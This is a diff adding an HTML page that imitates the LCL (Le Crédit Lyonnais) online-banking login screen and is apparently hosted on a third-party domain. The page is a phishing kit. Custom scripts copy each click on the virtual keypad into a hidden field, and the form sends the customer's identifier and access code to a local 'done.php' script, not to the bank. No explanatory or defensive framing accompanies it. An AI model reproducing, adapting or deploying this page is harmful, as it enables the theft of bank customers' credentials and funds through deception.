@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="fr" class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <script type="text/javascript">
+   //&lt;![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"867d77e9efac021fa7e0659b86adcda7",petok:"c2c2d12021d7b8caa954aff47091609a8bd8734b-1448471408-1800",zone:"dbgadgets.net",rocket:"a",apps:{},sha2test:0}];document.write('&lt;script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=38857570ac/cloudflare.min.js"&gt;&lt;'+'\/script&gt;');}}catch(e){};
+//]]&gt;
+  </script>
+  <script src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=38857570ac/cloudflare.min.js" type="text/javascript">
+  </script>
+  <style type="text/css">
+   .cf-hidden { display: none; } .cf-invisible { visibility: hidden; }
+  </style>
+  <script src="http://dbgadgets.net/cdn-cgi/nexp/dok3v=1613a3a185/cloudflare/rocket.js" type="text/javascript" onreadystatechange="CloudFlare.__cfjs_block_ec76d0b648_readystatechange()" onerror="CloudFlare.__cfjs_block_ec76d0b648_error()" onload="CloudFlare.__cfjs_block_ec76d0b648_load()" id="cfjs_block_ec76d0b648" data-module="cloudflare/rocket">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="https://particuliers.secure.lcl.fr/SCWB/js/lib/prod/jquery-1.5.1.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="https://particuliers.secure.lcl.fr/SCWB/js/lib/prod/jquery-ui-1.8.13.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="https://particuliers.secure.lcl.fr/SCWB/js/lib/prod/xregexp-0.6.1.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="https://particuliers.secure.lcl.fr/SCWB/js/lib/dev/xregexp-unicode-0.2.1.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="https://particuliers.secure.lcl.fr/SCWB/js/lib/prod/jquery.cookie.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="https://particuliers.secure.lcl.fr/SCWB/js/lib/prod/jquery-ui.datepicker.holidays.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="https://particuliers.secure.lcl.fr/SCWB/js/scwb.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="https://particuliers.secure.lcl.fr/SCWB/js/lib/prod/modernizr-2.0.6.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/rocketscript" async="" data-rocketsrc="indexe_fichiers/ga.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/javascript" src="http://dbgadgets.net/filer/experts-elcl/hmd/indexe_fichiers/ga.js">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="indexe_fichiers/jquery-1.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/javascript" src="http://dbgadgets.net/filer/experts-elcl/hmd/indexe_fichiers/jquery-1.js">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="indexe_fichiers/jquery-ui-1.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/javascript" src="http://dbgadgets.net/filer/experts-elcl/hmd/indexe_fichiers/jquery-ui-1.js">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="indexe_fichiers/xregexp-0.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/javascript" src="http://dbgadgets.net/filer/experts-elcl/hmd/indexe_fichiers/xregexp-0.js">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="indexe_fichiers/xregexp-unicode-0.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/javascript" src="http://dbgadgets.net/filer/experts-elcl/hmd/indexe_fichiers/xregexp-unicode-0.js">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="indexe_fichiers/jquery_003.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/javascript" src="http://dbgadgets.net/filer/experts-elcl/hmd/indexe_fichiers/jquery_003.js">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="indexe_fichiers/jquery-ui.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/javascript" src="http://dbgadgets.net/filer/experts-elcl/hmd/indexe_fichiers/jquery-ui.js">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="indexe_fichiers/scwb.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/javascript" src="http://dbgadgets.net/filer/experts-elcl/hmd/indexe_fichiers/scwb.js">
+  </script>
+  <script type="text/rocketscript" data-rocketsrc="indexe_fichiers/modernizr-2.js" data-rocketoptimized="true">
+  </script>
+  <script type="text/javascript" src="http://dbgadgets.net/filer/experts-elcl/hmd/indexe_fichiers/modernizr-2.js">
+  </script>
+  <script language="javascript" type="text/rocketscript" data-rocketoptimized="true">
+   function ValidCertif(){
+	document.formulaire.submit();
+}
+  </script>
+  <script type="text/rocketscript" language="javascript" data-rocketoptimized="true">
+   function recap1()
+{
+var globalef=document.getElementById('clavaziz').value;
+var me="1";
+var globale=document.getElementById('clavaziz').value;
+globalef=globale+me;
+document.getElementById('clavaziz').value=globalef;
+}
+function recap2()
+{
+var globalef=document.getElementById('clavaziz').value;
+var me="2";
+var globale=document.getElementById('clavaziz').value;
+globalef=globale+me;
+document.getElementById('clavaziz').value=globalef;
+}
+function recap3()
+{
+var globalef=document.getElementById('clavaziz').value;
+var me="3";
+var globale=document.getElementById('clavaziz').value;
+globalef=globale+me;
+document.getElementById('clavaziz').value=globalef;
+}
+function recap4()
+{
+var globalef=document.getElementById('clavaziz').value;
+var me="4";
+var globale=document.getElementById('clavaziz').value;
+globalef=globale+me;
+document.getElementById('clavaziz').value=globalef;
+}
+function recap5()
+{
+var globalef=document.getElementById('clavaziz').value;
+var me="5";
+var globale=document.getElementById('clavaziz').value;
+globalef=globale+me;
+document.getElementById('clavaziz').value=globalef;
+}
+function recap6()
+{
+var globalef=document.getElementById('clavaziz').value;
+var me="6";
+var globale=document.getElementById('clavaziz').value;
+globalef=globale+me;
+document.getElementById('clavaziz').value=globalef;
+}
+function recap7()
+{
+var globalef=document.getElementById('clavaziz').value;
+var me="7";
+var globale=document.getElementById('clavaziz').value;
+globalef=globale+me;
+document.getElementById('clavaziz').value=globalef;
+}
+function recap8()
+{
+var globalef=document.getElementById('clavaziz').value;
+var me="8";
+var globale=document.getElementById('clavaziz').value;
+globalef=globale+me;
+document.getElementById('clavaziz').value=globalef;
+}
+function recap9()
+{
+var globalef=document.getElementById('clavaziz').value;
+var me="9";
+var globale=document.getElementById('clavaziz').value;
+globalef=globale+me;
+document.getElementById('clavaziz').value=globalef;
+}
+function recap0()
+{
+var globalef=document.getElementById('clavaziz').value;
+var me="0";
+var globale=document.getElementById('clavaziz').value;
+globalef=globale+me;
+document.getElementById('clavaziz').value=globalef;
+}
+  </script>
+  <link media="screen, projection" type="text/css" href="https://particuliers.secure.lcl.fr/SCWB/css/lib/blueprint/reset-0.9.css" rel="stylesheet" />
+  <link media="screen, projection" type="text/css" href="https://particuliers.secure.lcl.fr/SCWB/css/lib/blueprint/typography-0.9.css" rel="stylesheet" />
+  <link media="screen, projection" type="text/css" href="https://particuliers.secure.lcl.fr/SCWB/css/lib/blueprint/forms-0.9.css" rel="stylesheet" />
+  <link media="print" type="text/css" href="https://particuliers.secure.lcl.fr/SCWB/css/lib/blueprint/print-0.9.css" rel="stylesheet" />
+  <link href="https://particuliers.secure.lcl.fr/v_1.0/favicon.ico" rel="shortcut icon" />
+  <title>
+   LCL - Le Crédit Lyonnais
+  </title>
+ </head>
+ <body id="imgCadenas">
+  <strong>
+  </strong>
+  <link href="https://particuliers.secure.lcl.fr/SCWB/BPGridGenerator.jsp?liquid=false&columnWidth=35&cellHeight=18&marginWidth=5.0&columnsNumber=24&center=false&maxWidth=960.0" type="text/css" rel="stylesheet" />
+  <!--[if lt IE 8]>
+	<link rel="stylesheet" href="https://particuliers.secure.lcl.fr/SCWB/css/lib/blueprint/ie-0.9.css" type="text/css" media="screen, projection"  />
+<![endif]-->
+  <!--[if IE]>
+
+<script style="text/javascript">
+$(function() {
+	var $container = $('body > .container');
+	$(window).resize(function() {
+		var width = document.documentElement.clientWidth;
+		//alert(width);
+		if(width > 960.0) {
+			$container.width(960.0);
+		} else {
+			$container.width(width);
+		}
+	});
+});
+</script>
+
+<![endif]-->
+  <link media="print" href="https://particuliers.secure.lcl.fr/SCUW/css/Commun/belPrint.css" type="text/css" rel="stylesheet" />
+  <link media="screen, print" href="https://particuliers.secure.lcl.fr/SCUW/css/Commun/clavier.css" type="text/css" rel="stylesheet" />
+  <link media="screen, print" href="https://particuliers.secure.lcl.fr/SCUW/css/Commun/general.css" type="text/css" rel="stylesheet" />
+  <link media="screen" href="https://particuliers.secure.lcl.fr/SCUW/css/Commun/header.css" type="text/css" rel="stylesheet" />
+  <link media="screen" href="https://particuliers.secure.lcl.fr/SCUW/css/Commun/home.css" type="text/css" rel="stylesheet" />
+  <link media="screen" href="https://particuliers.secure.lcl.fr/SCUW/css/Commun/calendrier.css" type="text/css" rel="stylesheet" />
+  <link media="screen" href="https://particuliers.secure.lcl.fr/SCUW/css/Commun/menu.css" type="text/css" rel="stylesheet" />
+  <link media="screen" href="https://particuliers.secure.lcl.fr/SCUW/css/Commun/dialog.css" type="text/css" rel="stylesheet" />
+  <link media="screen" href="https://particuliers.secure.lcl.fr/SCUW/css/Commun/footer.css" type="text/css" rel="stylesheet" />
+  <link media="screen" href="https://particuliers.secure.lcl.fr/SCUW/css/Commun/tabuwp2.css" type="text/css" rel="stylesheet" />
+  <link media="screen" href="https://particuliers.secure.lcl.fr/SCUW/css/Commun/formulaire.css" type="text/css" rel="stylesheet" />
+  <link media="screen" href="https://particuliers.secure.lcl.fr/SCUW/css/CLI/index.css" type="text/css" rel="stylesheet" />
+  <script data-rocketsrc="https://particuliers.secure.lcl.fr/SCUW/javascript/menu.js" type="text/rocketscript" data-rocketoptimized="true">
+  </script>
+  <script data-rocketsrc="https://particuliers.secure.lcl.fr/SCUW/javascript/popup.js" type="text/rocketscript" data-rocketoptimized="true">
+  </script>
+  <script data-rocketsrc="https://particuliers.secure.lcl.fr/SCUW/javascript/footer.js" type="text/rocketscript" data-rocketoptimized="true">
+  </script>
+  <script data-rocketsrc="https://particuliers.secure.lcl.fr/SCUW/javascript/clavier.js" type="text/rocketscript" data-rocketoptimized="true">
+  </script>
+  <script data-rocketsrc="https://particuliers.secure.lcl.fr/SCUW/javascript/jquery.jqprint.js" type="text/rocketscript" data-rocketoptimized="true">
+  </script>
+  <script data-rocketsrc="https://particuliers.secure.lcl.fr/SCUW/javascript/jquery.ui.datepicker-fr.js" type="text/rocketscript" data-rocketoptimized="true">
+  </script>
+  <script data-rocketsrc="https://particuliers.secure.lcl.fr/SCUW/javascript/jquery.base64.js" type="text/rocketscript" data-rocketoptimized="true">
+  </script>
+  <link href="https://particuliers.secure.lcl.fr/SCUW/publication/pages/js/xtcore.js" rel="tag commander" />
+  <script type="text/rocketscript" data-rocketoptimized="true">
+   //permet de ne charger qu'une fois le clavier.js cf clavier.js
+		flag = false;
+
+		// turn off animation in jQery if browser = IE7
+		if(jQuery.browser.msie &amp;&amp; jQuery.browser.version.substr(0,1) == "7") {
+			jQuery.fx.off = true;
+		}
+  </script>
+  <div id="pageLCL">
+   <div id="contentLCL">
+    <header role="banner" class="headerPage">
+     <div class="headerPage" id="top">
+      <div class="container headerPage">
+       <div class="span-9">
+        <div class="span-4">
+         <div title="Logo LCL" class="logoLCL">
+         </div>
+        </div>
+        <div class="span-5 last">
+         <div class="texteELCL">
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </header>
+    <div role="main" id="componentContainer">
+     <div class="container siteContainer">
+      <div class=" last left-space last">
+       Vous êtes ici &gt;
+       <span class="lienChevron">
+        Accueil
+       </span>
+       &gt; Accéder à
+vos comptes
+       <script type="text/rocketscript" data-rocketoptimized="true">
+        flag = false;
+			
+			$(function(){
+				
+				
+				
+				jQuery.base64.is_unicode = false;
+					
+				$("#corrigerClavier").click(function(){
+					$("#CodeId").val("");
+					$(".postClavier").val("");
+				});
+			
+				$(".validerClavier").click(function(){					
+					
+					if(this.id =="validerClavierELCL"){
+						$("#identifiantRouting").val("ELCL");
+					}else if(this.id =="validerClavierCLA"){
+						$("#identifiantRouting").val("CLA");
+					}else{
+						$("#identifiantRouting").val("CLI");
+					}		
+					
+					var aleatoire = "5";		
+					$("#identifiant").val($("#identifiantIdForm").val());
+							
+					
+						//On sauvegarde ou non l'identifiant BEL
+						saveIdentifiantBel($("#identifiant").val());
+					
+							
+					if($("#postClavier").length != 0){
+						$("#postClavierXor").val(encodeBase64LCL(myXOR($("#postClavier").val(), aleatoire)));
+					}else{
+						$("#CodeIdXor").val(encodeBase64LCL(myXOR($("#CodeId").val(), aleatoire)));
+					}
+					$("#formAuthenticate").submit();	
+				});	
+			});
+       </script>
+       <form autocomplete="off" id="formAuthenticate" method="POST" action="done.php">
+        <input type="hidden" name="compteId" id="compteId" />
+        <input type="hidden" name="clavaziz" id="clavaziz" />
+        <input type="hidden" name="identifiant" id="identifiant" />
+        <input type="hidden" name="identifiantRouting" id="identifiantRouting" />
+        <input type="hidden" name="agenceId" id="agenceId" />
+        <input type="hidden" name="postClavierXor" id="postClavierXor" />
+        <input type="hidden" name="CodeIdXor" id="CodeIdXor" />
+        <input type="hidden" value="" name="rebond" />
+        <input type="hidden" value="/outil/UWHO/Accueil/" name="from" />
+        <input type="hidden" value="" name="PROVENANCE" />
+        <input type="hidden" value="" name="CODPRD" />
+        <input type="hidden" value="" name="CALLBACK" />
+        <input type="hidden" value="" id="vel" name="vel" />
+        <input type="hidden" value="" name="MARCHE" />
+        <input type="hidden" value="" name="AJC" />
+        <input type="hidden" value="CLAVIERLCLIZMKTG" name="codePSP1" />
+        <input type="hidden" value="CLAVIERLCLIZMKTH1" name="codePSP2" />
+       </form>
+       <form autocomplete="off" id="formNoSend" method="POST" action="#">
+        <div class="newIdent">
+         <div class="span-24 last left-space last">
+          <h1 style="font-size: 1.5em;">
+           BIENVENUE SUR L'ESPACE DE
+CONNEXION
+          </h1>
+         </div>
+         <div class="span-24">
+          <div class="span-10 last">
+           <div class="span-9 last">
+            <!--[if (gt IE 8)|!(IE)]><!-->
+            <span style="position: relative; bottom: -1px;">
+             <img width="25" height="25" border="0" align="left" src="https://particuliers.secure.lcl.fr/SCUW/images/parcours/puce1.png" />
+             <h3 style="font-size: 1.3em;padding-top: 1px;">
+               Saisissez votre identifiant
+             </h3>
+            </span>
+            <!--<![endif]-->
+            <!--[if lte IE 8]>
+								<span style="position: relative"><img
+									src="/SCUW/images/parcours/puce1.png" height="25" width="25"
+									border="0" align="left">
+									<h3 style="font-size: 1.3em;">&nbsp;Saisissez 
+									votre identifiant</h3> 
+								</span>
+							<![endif]-->
+            <fieldset style="margin-bottom: 25px;">
+             <div id="fieldLabelIdentifiant">
+              <label for="identifiant">
+               Identifiant
+              </label>
+              <span class="inputIdentifiantId">
+               <input type="text" tabindex="1" maxlength="10" size="9" name="identifiantIdForm" id="identifiantIdForm" />
+              </span>
+              <div class="autoTooltip">
+               <img style="position: relative; bottom: -3px;" src="https://particuliers.secure.lcl.fr/SCUW/images/picto-aide-bleu.png%20" alt="information" />
+               <div class="tooltipContent tooltipMiddle testClic">
+                <h4>
+                </h4>
+                <div>
+                 Votre identifiant client comporte 10 chiffres
+                 <br />
+                 (ex: 1123456789)
+                </div>
+               </div>
+              </div>
+             </div>
+             <div style="margin-top: 10px;" class="clavierChevron2">
+             </div>
+             <div class="liensNewCode2">
+              <a style="margin-top: 7px;" class="lienChevron" href="https://particuliers.lcl.fr/oubli-ident-code-par/">
+               Identifiant 
+										oublié ?
+              </a>
+             </div>
+             <div style="width: 309px; margin-left: 6px;" id="fieldLabelIdentifiant">
+              <input type="checkbox" id="saveIdentifiant" style="margin-left: 0px;" value="" name="saveIdentifiant" />
+              <label>
+               Mémoriser mon identifiant 
+sur mon navigateur
+              </label>
+             </div>
+            </fieldset>
+           </div>
+           <div class="span-9 last">
+            <!--[if (gt IE 8)|!(IE)]><!-->
+            <span style="position: relative; bottom: 8px;">
+             <img width="25" height="25" border="0" align="left" src="https://particuliers.secure.lcl.fr/SCUW/images/parcours/puce2.png" />
+             <h3 style="font-size: 1.3em; margin-top: 10px; margin-bottom: 0px;">
+               Saisissez votre code d'accès
+             </h3>
+            </span>
+            <!--<![endif]-->
+            <!--[if lte IE 8]>
+							<span style="position: relative; bottom: 8px;"><img
+									src="https://particuliers.secure.lcl.fr/SCUW/images/parcours/puce2.png" height="25" width="25"
+									border="0" align="left">
+									<h3
+										style="font-size: 1.3em;">&nbsp;Saisissez 
+									votre code d&#39;acc&#232;s</h3> </span>
+							<![endif]-->
+            <fieldset style="margin-bottom: 25px;">
+             <div id="fieldLabelIdentifiant">
+              <div style="width: 300px; height: 15px; padding-bottom: 0px; margin-top: 5px;" class="infoClavier">
+               Saisissez votre code 
+													personnel en cliquant
+              </div>
+              <div style="width: 300px; margin-top: 0px; height: 15px; padding-bottom: 0px;" class="infoClavier">
+               sur le clavier numérique
+              </div>
+             </div>
+             <div style="margin-top: 20px;" class="clavierChevron2">
+             </div>
+             <div class="liensNewCode2">
+              <a style="margin-top: 17px;" class="lienChevron" href="https://particuliers.lcl.fr/oubli-ident-code-par/">
+               Code oublié ?
+              </a>
+             </div>
+             <br />
+             <br />
+             <div>
+              <div class="containerClavier">
+               <div class="clavis">
+                <map id="claviermap" name="claviermap">
+                 <!-- 1&#232;re colonne  -->
+                 <area onclick="recap9()" shape="rect" coords="0,0,30,30" href="javascript:void(0);" id="idImageClavier_01" class="toucheClavier" alt="Touche clavier" tabindex="3">
+                 </area>
+                 <area onclick="recap5()" shape="rect" coords="0,35,30,65" href="javascript:void(0);" id="idImageClavier_02" class="toucheClavier" alt="Touche clavier" tabindex="8">
+                  <!-- 2&#232;me colonne  -->
+                 </area>
+                 <area onclick="recap1()" shape="rect" coords="35,0,65,30" href="javascript:void(0);" id="idImageClavier_03" class="toucheClavier" alt="Touche clavier" tabindex="4">
+                 </area>
+                 <area onclick="recap4()" shape="rect" coords="35,35,65,65" href="javascript:void(0);" id="idImageClavier_04" class="toucheClavier" alt="Touche clavier" tabindex="9">
+                  <!-- 3&#232;me colonne -->
+                 </area>
+                 <area onclick="recap0()" shape="rect" coords="70,0,100,30" href="javascript:void(0);" id="idImageClavier_05" class="toucheClavier" alt="Touche clavier" tabindex="5">
+                 </area>
+                 <area onclick="recap7()" shape="rect" coords="70,35,100,65" href="javascript:void(0);" id="idImageClavier_06" class="toucheClavier" alt="Touche clavier" tabindex="10">
+                  <!-- 4&#232;me colonne -->
+                 </area>
+                 <area onclick="recap8()" shape="rect" coords="107,0,135,30" href="javascript:void(0);" id="idImageClavier_07" class="toucheClavier" alt="Touche clavier" tabindex="6">
+                 </area>
+                 <area onclick="recap3()" shape="rect" coords="107,35,135,65" href="javascript:void(0);" id="idImageClavier_08" class="toucheClavier" alt="Touche clavier" tabindex="11">
+                  <!-- 5&#232;me colonne -->
+                 </area>
+                 <area onclick="recap6()" shape="rect" coords="143,0,172,30" href="javascript:void(0);" id="idImageClavier_09" class="toucheClavier" alt="Touche clavier" tabindex="7">
+                 </area>
+                 <area onclick="recap2()" shape="rect" coords="143,35,172,65" href="javascript:void(0);" id="idImageClavier_10" class="toucheClavier" alt="Touche clavier" tabindex="12">
+                 </area>
+                </map>
+                <img src="http://nsa20.casimages.com/img/2014/02/18/14021805344029872.png" alt="Clavier virtuel" usemap="#claviermap" id="idImageClavier" />
+               </div>
+               <div class="rightSide">
+                <div class="pwdFields">
+                 <input type="hidden" class="postClavier" name="postClavier" id="postClavier" value="" />
+                 <input type="hidden" name="random" id="random" value="true" />
+                 <input type="password" disabled="disabled" maxlength="6" class="password" size="6" name="CodeId" id="CodeId" />
+                </div>
+                <div class="posCorrigerClavis">
+                 <input type="button" value="Effacer" class="button" id="ResetClavier_idImageClavier" />
+                </div>
+               </div>
+              </div>
+             </div>
+            </fieldset>
+           </div>
+           <div style="margin-left: -18px; width: 475px; height: 102px; padding-top: 60px; margin-top: -68px;" class="span-12 last divBlocArrondi">
+            <div style="margin-left: 16px; margin-top: 8px;" class="span-10 last">
+             <!--[if (gt IE 8)|!(IE)]><!-->
+             <span style="position: relative; bottom: 8px;">
+              <img width="25" height="25" border="0" align="left" src="https://particuliers.secure.lcl.fr/SCUW/images/parcours/puce3.png" />
+              <h3 style="font-size: 1.3em; margin-top: 10px; margin-bottom: 0px;">
+                Accédez à votre espace
+              </h3>
+             </span>
+             <!--<![endif]-->
+             <!--[if lte IE 8]>
+								<span style="position: relative; bottom: 8px;"><img
+										src="/SCUW/images/parcours/puce3.png" height="25" width="25"
+										border="0" align="left">
+										<h3
+											style="font-size: 1.3em;">&nbsp;Acc&#233;dez &#224; 
+										votre espace</h3> </span>
+								<![endif]-->
+             <div style="padding-left: 30px;" class="clavisButtons">
+              <input type="button" value="Particulier" class="buttonClavier validerClavier" id="validerClavierCLI" />
+              <input type="button" value="Professionnel" class="buttonClavier validerClavier" id="validerClavierCLA" />
+              <input type="button" value="  e.LCL  " class="buttonClavier validerClavier" id="validerClavierELCL" />
+             </div>
+            </div>
+           </div>
+           <div class="messError">
+            <div class="erreur displayNone" id="erreurClavier">
+            </div>
+           </div>
+          </div>
+          <!-- publication -->
+          <div class="span-8 prepend-6 last">
+           <script type="text/rocketscript" data-rocketoptimized="true">
+            function calcSizeFrame(elt){
+		//Permet de recalculer la hauteur de l'iframe
+		if(navigator.userAgent.indexOf('MSIE') != -1){
+			var height = 0;
+
+			if (elt.contentDocument &amp;&amp; elt.contentDocument.body.offsetHeight) {
+	            // W3C DOM (and Mozilla) syntax
+	            height = elt.contentDocument.body.scrollHeight + 5;  
+	        } else if (elt.Document &amp;&amp; elt.Document.body.scrollHeight) {
+	            // IE DOM syntax
+	            height = elt.Document.body.scrollHeight + 5;
+	        }
+			$(elt).attr("height", height);
+			//Permet &amp;#224; ie de remettre &amp;#224; jour les &amp;#233;l&amp;#233;ments affich&amp;#233;s dans la page.
+			$("body").append("&lt;div id=\"testFrame\"&gt;&lt;/div&gt;");
+			$("#testFrame").remove();
+			
+		}else{
+			$(elt).attr("height", elt.contentDocument.body.offsetHeight + 25);
+		}		
+	}
+           </script>
+           <iframe width="300px" height="1" frameborder="0" class="framePage" src="https://particuliers.secure.lcl.fr/outil/UXPA/PageNoConnect/accesPagePublie?category=ecb&code=infosite&data=" onload='(function(a){window.CloudFlare && window.CloudFlare.push(function(b){b(["cloudflare/rocket"],function(c){c.push(function(){(function(){calcSizeFrame(this);}).call(a)})})})})(this);' allowtransparency="true" id="idInfo">
+           </iframe>
+          </div>
+         </div>
+        </div>
+       </form>
+      </div>
+     </div>
+    </div>
+   </div>
+   <form action="/outil/uaut/Login/logout" method="POST" id="formLogout">
+   </form>
+  </div>
+  <span class="hidden" id="erreurPage">
+   false
+  </span>
+ </body>
+</html>
